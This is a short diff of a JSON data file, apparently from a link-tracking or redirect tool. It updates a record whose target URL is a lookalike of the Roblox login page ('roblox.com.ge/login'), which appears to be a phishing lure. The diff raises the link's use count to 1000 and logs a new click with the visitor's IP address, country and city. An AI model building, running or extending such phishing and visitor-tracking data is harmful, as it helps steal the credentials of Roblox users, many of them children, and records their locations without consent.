@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 999,
+    "useCount": 1000,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8112,6 +8112,14 @@
         "city": "Sutton Coldfield",
         "flag": "🇬🇧",
         "countryCode": "GB"
+      },
+      {
+        "timestamp": 1777222539727,
+        "ip": "79.162.1.82",
+        "country": "Poland",
+        "city": "Dobrzyń nad Wisłą",
+        "flag": "🇵🇱",
+        "countryCode": "PL"
       }
     ]
   },
